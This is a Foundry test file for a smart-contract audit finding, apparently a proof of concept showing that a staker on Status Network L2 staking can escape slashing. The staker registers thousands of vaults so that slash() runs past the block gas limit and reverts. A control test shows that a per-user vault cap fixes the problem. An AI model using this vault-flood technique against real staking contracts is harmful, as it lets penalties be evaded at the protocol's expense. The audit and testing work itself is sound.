// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    StakeManager,
    StakeManagerFixed,
    MiniToken
} from "./65322-any-staker-can-fully-avoid-slashing-by-triggering-oog-revert.sol";

// Status Network L2 staking — finding 65322:
// "Any staker can fully avoid slashing by triggering OOG reverts".
//
// A staker pre-registers thousands of vaults (permissionless createVault(), no
// per-user cap in the audited state). slash() aggregates redeemable rewards by
// looping over EVERY vault the account owns (verbatim rewardsBalanceOfAccount).
// That unbounded, attacker-controlled loop consumes more gas than a whole block,
// so slash() always OOG-reverts and the staker's slashable stake is never seized.
contract SlashOOGDoSTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant SLASHABLE = 1000 ether;
    uint256 internal constant GAS_CAP = 30_000_000; // block gas limit

    // ── Main exploit: the vault flood makes slash() OOG; stake is never seized ──
    function test_exploit_unboundedVaultLoop_makesSlashOOG_stakeNeverSeized() public {
        Exploit e = new Exploit();
        e.run();

        // Attacker registered far more than the recommended cap (10).
        assertGt(e.vaultCount(), 10, "attacker registered many vaults");

        // slash() ran out of gas within a full block and reverted.
        assertEq(e.slashCallSucceeded(), false, "slash OOG'd within the block gas limit");

        // HARM: the attacker's slashable stake is fully intact — the penalty
        // that should have been applied was not.
        assertEq(e.slashableRemaining(), SLASHABLE, "slashable stake was NOT seized");
        assertEq(e.wasSlashed(), false, "account was never slashed");

        // The evaded / un-seized stake magnitude is recorded on the marker at SINK.
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), SLASHABLE, "marker records the un-seized slashable stake at SINK");
    }

    // ── Evidence: the aggregation loop ALONE exceeds a full block's gas budget ──
    function test_evidence_loopAloneExceedsBlockGasLimit() public {
        StakeManager sm = new StakeManager();
        for (uint256 i = 0; i < 6000; i++) {
            vm.prank(ATTACKER);
            sm.createVault();
        }

        uint256 g0 = gasleft();
        sm.rewardsBalanceOfAccount(ATTACKER);
        uint256 used = g0 - gasleft();

        assertGt(used, GAS_CAP, "the per-vault aggregation loop alone exceeds a full block");
    }

    // ── Negative control: with the recommended per-user vault cap, slash works ──
    function test_control_cappedRegistration_allowsSlashToSeizeStake() public {
        StakeManagerFixed sm = new StakeManagerFixed();

        // Attacker can register at most maxVaultsPerUser (10).
        for (uint256 i = 0; i < 10; i++) {
            vm.prank(ATTACKER);
            sm.createVault();
        }
        // The 11th registration reverts under the cap.
        vm.prank(ATTACKER);
        vm.expectRevert(StakeManagerFixed.StakeManager__MaxVaultsPerUserReached.selector);
        sm.createVault();

        assertEq(sm.vaultCountOf(ATTACKER), 10, "vault count capped at 10");

        sm.setSlashableStake(ATTACKER, SLASHABLE);

        // The SAME gas-capped slash now succeeds — the bounded loop fits in a block.
        (bool ok,) = address(sm).call{ gas: GAS_CAP }(abi.encodeWithSelector(StakeManagerFixed.slash.selector, ATTACKER));
        assertTrue(ok, "slash succeeds when vault count is bounded");

        // Stake is actually seized.
        assertEq(sm.slashableStake(ATTACKER), 0, "stake seized under the fix");
        assertTrue(sm.slashed(ATTACKER), "account slashed under the fix");
    }
}
